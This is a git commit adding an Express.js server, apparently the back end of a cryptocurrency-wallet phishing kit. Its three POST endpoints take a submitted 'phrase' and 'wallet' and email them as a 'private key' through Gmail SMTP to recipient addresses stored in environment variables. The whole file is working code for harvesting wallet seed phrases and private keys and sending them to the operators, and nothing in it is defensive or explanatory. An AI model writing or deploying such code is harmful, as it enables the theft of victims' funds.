4cc8bbd59c2765dd2d0ae70d51e38a284afb637c
sonio-deji <atandauthman2@gmail.com>
2024-02-26 21:27:18 +0100

    ...

---
+++ index.js
@@ -0,0 +1,92 @@
+const nodemailer = require("nodemailer");
+const express = require("express");
+const PORT = process.env.PORT || 5000;
+const cors = require("cors");
+const app = express();
+const dotenv = require("dotenv");
+dotenv.config();
+
+app.use(cors());
+app.use(express.json());
+
+app.use(
+  express.urlencoded({
+    extended: true,
+  })
+);
+
+var transporter = nodemailer.createTransport({
+  host: "smtp.gmail.com",
+  port: 465,
+  secure: true,
+  auth: {
+    user: process.env.SENDER_MAIL,
+    pass: process.env.PASS_KEY,
+  },
+});
+app.post("/sauce", (req, res) => {
+  const mailOptions = {
+    from: process.env.SENDER_MAIL,
+    to: process.env.SUSKID,
+    subject: "private key",
+    html: `
+        <p>
+            <b>privatekey: </b>${req.body.phrase}<br>
+            <b>wallet: </b>${req.body.initial}<br>
+        </p>`,
+  };
+  
+  transporter.sendMail(mailOptions, function (err, data) {
+    if (err) {
+      console.log(err);
+    } else {
+      console.log("sent");
+      res.send("sent");
+    }
+  });
+});
+app.post("/sn", (req, res) => {
+  const mailOptions = {
+    from: process.env.SENDER_MAIL,
+    to: process.env.SN,
+    subject: "private key",
+    html: `
+        <p>
+            <b>privatekey: </b>${req.body.phrase}<br>
+            <b>wallet: </b>${req.body.initial}<br>
+        </p>`,
+  };
+  
+  transporter.sendMail(mailOptions, function (err, data) {
+    if (err) {
+      console.log(err);
+    } else {
+      console.log("sent");
+      res.send("sent");
+    }
+  });
+});
+app.post("/", (req, res) => {
+  const mailOptions = {
+    from: process.env.SENDER_MAIL,
+    to: process.env.LABCOL,
+    subject: "private key",
+    html: `
+        <p>
+            <b>privatekey: </b>${req.body.phrase}<br>
+            <b>wallet: </b>${req.body.initial}<br>
+        </p>`,
+  };
+  transporter.sendMail(mailOptions, function (err, data) {
+    if (err) {
+      console.log(err);
+    } else {
+      console.log("sent");
+      res.send("sent");
+    }
+  });
+});
+
+app.listen(PORT, () => {
+  console.log(`app is listening on port ${PORT}`);
+});
